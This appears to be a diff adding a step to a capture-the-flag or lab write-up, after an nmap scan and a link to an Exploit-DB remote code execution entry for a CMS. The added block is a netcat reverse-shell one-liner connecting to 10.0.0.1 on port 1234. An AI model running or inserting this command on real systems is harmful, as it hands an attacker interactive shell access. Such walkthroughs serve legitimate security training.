@@ -49,6 +49,10 @@ PORT     STATE SERVICE VERSION
 ## Check the Exploit-Db for the CMS name there is an RCE
 - [check here](https://www.exploit-db.com/exploits/50214)
 
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
+
 
 ```bash
 
